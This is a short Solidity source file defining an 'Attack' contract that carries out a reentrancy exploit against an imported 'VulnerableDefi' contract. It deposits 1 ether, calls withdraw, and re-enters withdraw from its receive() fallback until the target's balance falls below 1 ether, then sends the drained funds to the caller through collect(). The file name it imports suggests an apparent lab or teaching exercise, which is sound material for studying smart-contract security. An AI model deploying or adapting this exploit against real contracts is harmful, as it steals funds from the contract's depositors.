// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attack {
    VulnerableDefi public target;

    constructor(address _target) {
        target = VulnerableDefi(payable(_target));
    }

    function attack() external payable {
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
